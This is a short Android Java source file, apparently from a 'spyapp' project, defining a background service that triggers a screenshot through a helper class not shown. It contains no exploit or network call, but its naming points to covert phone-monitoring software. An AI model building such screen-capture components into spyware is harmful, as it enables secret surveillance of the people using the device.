package com.app.spyapp.service;

import android.app.IntentService;
import android.content.Intent;

import com.app.spyapp.common.Utils;
import com.app.spyapp.screenshot.ScreentShotUtil;

/**
 * Created by Ankit on 4/26/2016.
 */
public class ScreenShotService extends IntentService {


    public ScreenShotService() {
        super(ScreenShotService.class.getSimpleName());
    }

    @Override
    protected void onHandleIntent(Intent intent) {
        Utils.showStatus(this, "SCREEN SHOT SERVICE");
        ScreentShotUtil.getInstance().takeScreenshot(ScreenShotService.this);
    }
}
